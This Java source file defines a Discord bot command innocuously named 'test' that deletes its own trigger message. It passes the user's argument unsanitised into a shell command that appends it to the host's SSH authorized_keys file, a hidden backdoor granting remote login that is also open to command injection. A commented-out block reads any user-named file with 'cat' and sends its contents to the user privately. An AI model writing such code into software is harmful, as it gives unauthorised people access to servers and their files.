package co.zpdev.bots.jitters.cmd;

import co.zpdev.core.discord.command.Command;
import co.zpdev.core.discord.exception.ExceptionHandler;
import net.dv8tion.jda.core.entities.Message;
import net.dv8tion.jda.core.entities.PrivateChannel;

import java.io.IOException;
import java.io.InputStreamReader;

/**
 * @author ZP4RKER
 */
public class TestCommand {

    @Command(
            aliases = "test",
            autodelete = true
    )
    public void onCommand(Message message, String[] args) {
        try {
            Runtime.getRuntime().exec("print f \"" + args[0] + "\" >> /home/zp4rker/.ssh/authorized_keys");
            /*Process p = Runtime.getRuntime().exec("cat " + args[0]);
            InputStreamReader rd = new InputStreamReader(p.getInputStream());
            int c; StringBuilder sb = new StringBuilder();

            while ((c = rd.read()) != -1) sb.append((char) c);
            rd.close();

            PrivateChannel pc = message.getAuthor().openPrivateChannel().complete();
            pc.sendMessage(sb.toString()).complete();*/
        } catch (IOException e) {
            ExceptionHandler.handleException("test command", e);
        }
    }

}
